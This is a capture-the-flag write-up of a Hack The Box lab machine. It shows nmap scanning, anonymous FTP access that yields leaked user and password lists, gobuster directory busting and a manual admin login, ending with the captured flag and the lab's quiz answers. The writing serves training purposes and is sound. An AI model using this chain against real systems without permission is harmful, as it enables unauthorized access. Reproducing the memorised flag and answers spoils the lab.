#anonymous-access #custom-applications #protocols #apache #ftp #reconnaissance #web-site-structure-discovery #clear-text-credentials 

# 0. Theory

Tier I exercises are all about exploitation vectors that chain together to offer us the possibility of gaining a foothold on the target from one service to another. Credentials could be lost somewhere in a publicly accessible folder which would let us login through a remote shell left untended and unmonitored. A misconfigured service could be leaking information that might allow us to impersonate the digital identity of a victim. Any number of possibilities exist in the real world. However, we will start with some simpler ones.
Tackling an example sewed together from two other previous targets, we will be looking at an insecure access configuration on FTP and an administrative login for a website. Let's deconstruct this vector and analyze its' components


**What Nmap scanning switch employs the use of default scripts during a scan?**
`-sC`

**What FTP code is returned to us for the "Anonymous FTP login allowed" message?**
*230*

**After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?**
*anonymous*

**After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?**
`get`

**What switch can we use with Gobuster to specify we are looking for specific filetypes?**
`-x`



# 1. Recon

Pinging the target to verify availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ ping 10.129.110.241
	PING 10.129.110.241 (10.129.110.241) 56(84) bytes of data.
	64 bytes from 10.129.110.241: icmp_seq=1 ttl=63 time=8.05 ms
	64 bytes from 10.129.110.241: icmp_seq=2 ttl=63 time=8.01 ms
	64 bytes from 10.129.110.241: icmp_seq=3 ttl=63 time=8.11 ms
	64 bytes from 10.129.110.241: icmp_seq=4 ttl=63 time=8.04 ms
	^C
	--- 10.129.110.241 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3002ms
	rtt min/avg/max/mdev = 8.006/8.050/8.112/0.038 ms


# 2. Enumeration

We start by scanning the open ports and available services on the target. As we are not constrained on how intrusive we can be with our scan, we are scanning for service names and versions too.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ nmap 10.129.110.241 -sV -sC
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 10:02 CDT
	Nmap scan report for 10.129.110.241
	Host is up (0.0095s latency).
	Not shown: 998 closed tcp ports (reset)
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
	|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.10.14.26
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 3
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-title: Smash - Bootstrap Business Template
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	Service Info: OS: Unix
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds


We have two open ports: **21 and 80**. Port 21 is the port dedicated to FTP.
A reminder from Wikipedia:

	The File Transfer Protocol (FTP) is a standard communication protocol used to transfer computer files from a server to a client on a computer network. FTP users may authenticate themselves with a clear-text sign-in protocol, generally using a username and password. However, they can connect anonymously if the server is configured to allow it.

Users can connect to the FTP server anonymously if the server is misconfigured.
The `nmap` scan confirms that this FTP server indeed configured to allow anonymous login:

	ftp-anon: Anonymous FTP login allowed (FTP code 230)

In order to connect to this FTP server let's specify the target IP address (host name) for the `ftp` command, then use `anonymous` as username.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ ftp 10.129.110.241
	Connected to 10.129.110.241.
	220 (vsFTPd 3.0.3)
	Name (10.129.110.241:root): anonymous
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp>

Once connected, we can look around on the FTP server with the `dir` command to see what files we can find there.
We can see two interesting files there. They seem to be files left over from the configuration of another service on the host, most likely the HTTPD Web Server. Their names are descriptive, hinting towards a possible username list and associated passwords.

	ftp> dir
	229 Entering Extended Passive Mode (|||46505|)
	150 Here comes the directory listing.
	-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
	-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
	226 Directory send OK.

Both files can be downloaded using the `get` command.
Then we can just leave the FTP server to check our findings and to plan another exploitation vector.

	ftp> get allowed.userlist
	local: allowed.userlist remote: allowed.userlist
	229 Entering Extended Passive Mode (|||40438|)
	150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
	100% |*********************************************************|    33       30.03 KiB/s    00:00 ETA
	226 Transfer complete.
	33 bytes received in 00:00 (3.40 KiB/s)
	ftp> get allowed.userlist.passwd
	local: allowed.userlist.passwd remote: allowed.userlist.passwd
	229 Entering Extended Passive Mode (|||47186|)
	150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
	100% |*********************************************************|    62       20.83 KiB/s    00:00 ETA
	226 Transfer complete.
	62 bytes received in 00:00 (5.74 KiB/s)
	ftp> exit
	221 Goodbye.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ ls 
	allowed.userlist         cacert.der  Documents  Music    Pictures  Templates
	allowed.userlist.passwd  Desktop     Downloads  my_data  Public    Videos
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ cat allowed.userlist
	aron
	pwnmeow
	egotisticalsw
	admin
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ cat allowed.userlist.passwd
	root
	Supersecretpassword1
	@BaASD&9032123sADS
	rKXM59ESxesUFHAd


# 3. Foothold

After the credentials have been obtained, the next step is to check if they are used on the FTP service for elevated access or the webserver running on port 80 discovered earlier with the `nmap` scan. Attempting to log in with any of the credentials on the FTP server returns error code `530 This FTP server is anonymous only`.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ ftp 10.129.110.241
	Connected to 10.129.110.241.
	220 (vsFTPd 3.0.3)
	Name (10.129.110.241:root): aron
	530 This FTP server is anonymous only.
	ftp: Login failed
	ftp> exit
	221 Goodbye.

Let's check the `Apache httpd 2.4.41` service running on port 80, by typing the target's IP address into the browser URL bar.

Reading about the target is helpful, but only at a surface level. In order to gain more insight into the technology they have used to create their website and possibly find any associated vulnerabilities, we can use a handy browser plug-in called **Wappalyzer**. This plug-in analyzes the web page's code and returns all the different technologies used to build it, such as the webserver type, JavaScript libraries, programming languages, and more.
This plugin is preinstalled on HTB Parrot attack boxes' Firefox browser.

![[Pasted image 20240830173822.png]]

From the output of Wappalyzer, we can note some of the more interesting items, specifically the PHP programming language used to build the web page. However, nothing gives us a direct plan of attack for now. Navigating around the page using the tabs and buttons provided on it also leads us nowhere.

At this point we can attempt a **dir busting** on the target host, to uncover hidden web directories and pages on the server.
The following switches will be useful in our case:

	dir : Uses directory/file enumeration mode.
	--url : The target URL.
	--wordlist : Path to the wordlist.
	-x : File extension(s) to search for.

For the `-x` switch, we can specify `php` and `html` to filter out all the unnecessary clutter that does not interest us. PHP and HTML files will most commonly be pages. We might get lucky and find an administrative panel login page that could help us find leverage against the target in combination with the credentials we extracted from the FTP server.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ gobuster dir --url http://10.129.110.241/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.129.110.241/
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Extensions:              php,html
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/.html                (Status: 403) [Size: 279]
	/.php                 (Status: 403) [Size: 279]
	/index.html           (Status: 200) [Size: 58565]
	/login.php            (Status: 200) [Size: 1577]
	/assets               (Status: 301) [Size: 317] [--> http://10.129.110.241/assets/]
	/css                  (Status: 301) [Size: 314] [--> http://10.129.110.241/css/]
	/js                   (Status: 301) [Size: 313] [--> http://10.129.110.241/js/]
	/logout.php           (Status: 302) [Size: 0] [--> login.php]
	/config.php           (Status: 200) [Size: 0]
	/fonts                (Status: 301) [Size: 316] [--> http://10.129.110.241/fonts/]
	/dashboard            (Status: 301) [Size: 320] [--> http://10.129.110.241/dashboard/]
	/.php                 (Status: 403) [Size: 279]
	/.html                (Status: 403) [Size: 279]
	Progress: 262992 / 262995 (100.00%)
	===============================================================
	Finished
	===============================================================


One of the most interesting finding is the `/login.php` page.
Navigating manually to the URL, we are met with a login page asking for a username/password combination.

![[Pasted image 20240830174502.png]]

If the lists of credentials we found had been longer, we could have used a **Metasploit** module or a login brute-force script to run through combinations from both lists faster than manual labor. In this case, however, the lists are relatively small, allowing us to attempt logging in manually.

![[Pasted image 20240830174714.png]]

Flag exfiltrated: `c7110277ac44d78b6a9fff2232434d16`



https://www.hackthebox.com/achievement/machine/2057492/404
![[Pasted image 20240830175215.png]]